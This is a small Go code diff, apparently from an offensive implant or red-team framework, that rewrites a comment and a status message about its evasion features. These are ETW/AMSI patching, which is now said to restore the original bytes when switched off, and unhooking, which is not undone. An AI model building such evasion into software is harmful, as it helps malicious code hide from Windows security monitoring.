@@ -46,7 +46,9 @@ type EvasionCapability struct {
 	// Zh/En 人类可读名
 	Zh, En string
 	// StartupOnly 为 true 表示"只在启动期执行"（ETW/AMSI 补丁、unhook）：
-	// 运行期打开=立即执行一次，关掉无法把已改的字节恢复原样（回执里会说明）。
+	// 运行期打开=立即执行一次；关掉时 ETW/AMSI 会按 patch 台账还原原始字节
+	// （见 evasion/patch_registry_windows.go），unhook 不重挂（撤销 unhook 等于
+	// 主动重新 hook，那是另一件事，不做）。
 	StartupOnly bool
 	// ReqAmd64 该能力只在 windows/amd64 有实现
 	ReqAmd64 bool
@@ -216,7 +218,7 @@ func EvasionStatus() []EvasionStatusRow {
 			row.Active = row.Compiled
 		}
 		if c.StartupOnly {
-			row.Note = "启动期能力：运行期打开=立即执行一次，关掉不会撤销已打的补丁"
+			row.Note = "启动期能力：运行期打开=立即执行一次；etw/amsi 关掉会还原原始字节，unhook 关掉不回挂"
 		}
 		rows = append(rows, row)
 	}
